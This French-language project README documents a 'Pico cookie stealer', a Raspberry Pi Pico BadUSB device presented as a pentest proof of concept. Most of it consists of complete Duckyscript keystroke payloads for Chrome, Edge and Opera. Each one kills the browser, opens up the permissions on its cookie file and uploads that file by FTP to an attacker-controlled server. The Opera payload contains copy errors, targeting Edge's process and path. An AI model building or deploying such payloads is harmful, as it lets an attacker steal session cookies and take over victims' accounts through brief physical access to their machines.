# P.O.C. : Pico cookie stealer 🍪
![page de garde](https://i.postimg.cc/sDLF4mMg/8ptlvi.jpg)
###### auteurs : Bjorn HOUGEN, Nathan DERC, Georges LE GOASTER
## Sommaire
- [Introduction](#A)
- [Fonctionnement ⚙️](#B)
- [Objectif 🎯](#C)
- [Mise en œuvre 🛠️](#D)
	- [Le hardware](#E)
	- [Le software](#F)
- [Les Problèmes 🪳](#G)
	- [Brickage du premier hardware 🧱](#H)
	- [Firefox 🔥🦊](#I)
- [Axes d'amélioration 📈](#J)
- [Conclusion](#K)
	
## Introduction  <a id="A"></a>
Le but de ce projet est, par un moyen matériel, de récupérer des données sensible d'un utilisateur via un vecteur d'attaque physique.
## Fonctionnement ⚙️ <a id="B"></a>
Fig. 1<a id="L"></a>
![Fonctionnement](https://i.postimg.cc/PrxVy6QW/Untitled-diagram-2024-05-10-124720.png)

Fig. 2
![pin-connections](https://i.postimg.cc/WpQ8GsZQ/Capture-d-cran-2024-03-20-114154.png)

 1. désactive l'execution de la payload
 2. cache le stockage flash
 3. active la payload n°2
 4. active la payload n°3
 5. active la payload n°4

## Objectif 🎯<a id="C"></a>
Le but de ce projet est de mettre en lumière l'un des point d'entrée les plus vulnérables d'une machine : ses ports USB. La plupart des machines sont peu, ou pas protégées contre ce type d'attaque. Bien que les principaux outils pour ce type d'attaque soient assez onéreux, le but était aussi de montrer que ce vecteur d'attaque est accessible à peu de frais.

## Mise en œuvre 🛠️<a id="D"></a>
Ceette documentation vise à la création d'un outil de pentest permettant, de simuler les frappes sur un clavier de la machine cible afin de récupérer des donné envoyées vers un serveur FTP (cf [figure 1](#L))
### Le hardware <a id="E"></a>
Le hardware utilisé est une carte Raspberry Pi Pico équipée d'un microcontrolleur RP2040 capable d'executer du code micropython (dans notre cas un fork : [circuitpython](https://github.com/adafruit/circuitpython)
Le serveur FTP utilisé est une machine virtuelle sous Debian 12 hébergé sur une Freebox Ultra qui fais tourner [vsftpd](https://security.appspot.com/vsftpd/vsftpd_conf.html)
### Le Software <a id="F"></a>
Pour la partie software, le code est issu du repository de [dbisu](https://github.com/dbisu/pico-ducky) dépouillé des fichiers contenant les dispositions de clavier autres que le azerty français ainsi que de la partie dédiée à la version wireless de la carte: `secrets.py`, `webapp.py` et `wsgiserver.py`
### Les payloads 🚀<a id="G"></a>
Voici les payloads écrites en duckyscript pour les différents navigateurs 
#### Chrome
```duckyscript
GUI r
DELAY 1500
STRING powershell
ENTER
DELAY 2000
STRING Stop-Process -Name "chrome"
ENTER
DELAY 2000
STRING $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Tout le monde", "FullControl", "Allow"); $acl = Get-Acl -Path 'AppData\Local\Google\Chrome\User Data\Default\Network\Cookies'; $acl.SetAccessRule($rule); Set-Acl -Path 'AppData\Local\Google\Chrome\User Data\Default\Network\Cookies' -AclObject $acl
ENTER
DELAY 2000
STRING ftp [adresse du serveur]
ENTER
DELAY 2000
STRING thief
ENTER
DELAY 2000
STRING thief
ENTER
DELAY 2000
STRING put "AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
DELAY 2000
ENTER
DELAY 4000
ALT F4
```
#### Edge
```duckyscript
GUI r
DELAY 1500
STRING powershell
ENTER
DELAY 2000
STRING Stop-Process -Name "msedge"
ENTER
DELAY 2000
STRING $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Tout le monde", "FullControl", "Allow"); $acl = Get-Acl -Path 'AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies'; $acl.SetAccessRule($rule); Set-Acl -Path 'AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies' -AclObject $acl
ENTER
DELAY 2000
STRING ftp [adresse du serveur]
ENTER
DELAY 2000
STRING thief
ENTER
DELAY 2000
STRING thief
ENTER
DELAY 2000
STRING put "AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies"
DELAY 2000
ENTER
DELAY 4000
ALT F4
```
#### Opera
```duckyscript
GUI r
DELAY 1500
STRING powershell
ENTER
DELAY 2000
STRING Stop-Process -Name "msedge"
ENTER
DELAY 2000
STRING $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Tout le monde", "FullControl", "Allow"); $acl = Get-Acl -Path 'AppData\Roaming\Opera Software\Opera Stable\Default\Network\cookies'; $acl.SetAccessRule($rule); Set-Acl -Path 'AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies' -AclObject $acl
ENTER
DELAY 2000
STRING ftp [adresse du serveur]
ENTER
DELAY 2000
STRING thief
ENTER
DELAY 2000
STRING thief
ENTER
DELAY 2000
STRING put "AppData\Roaming\Opera Software\Opera Stable\Default\Network\cookies"
DELAY 2000
ENTER
DELAY 4000
ALT F4
```
#### Firefox
🚧work in progress🚧

## Les Problèmes 🪳<a id="G"></a>

### Brickage du premier hardware 🧱<a id="H"></a>
Le premier hardware envisagé pour ce projet était une clé USB comportant un microcontrolleur phison-2307 vulnérable pouvant être [converti en bad-USB](https://github.com/bidhata/phison-2307-BadUSB) en modifiant son firmware via un éditeur exadécimal. devant l'impossibilité de retrouver ce même hardware nous en avons choisi un plus accessible.

### Firefox 🔥🦊<a id="I"></a>
Le chemin d'accès vers le fichier `cookies.sqlite`comprenant une chaine de caractères générée par  d'un utilisateur à l'autre, nous ne sommes pas parvenus à l'extraire.

## Axes d'amélioration 📈<a id="J"></a>
- Finition avec boitier et interrupteurs
- Payload pour firefox

## Conclusion <a id="K"></a>
En conclusion, ce projet a exploré les vulnérabilités des ports USB, démontrant la fragilité de ces dispositifs face aux attaques physiques. Ce projet nous a aussi permis d'explorer plusieur aspects de l'informatique : le bas niveau, pe python, le scripting ainsi que le réseau, ainsi qu'une communication entre les membres du groupe pour mener à bien les diférentes composantes de ce projet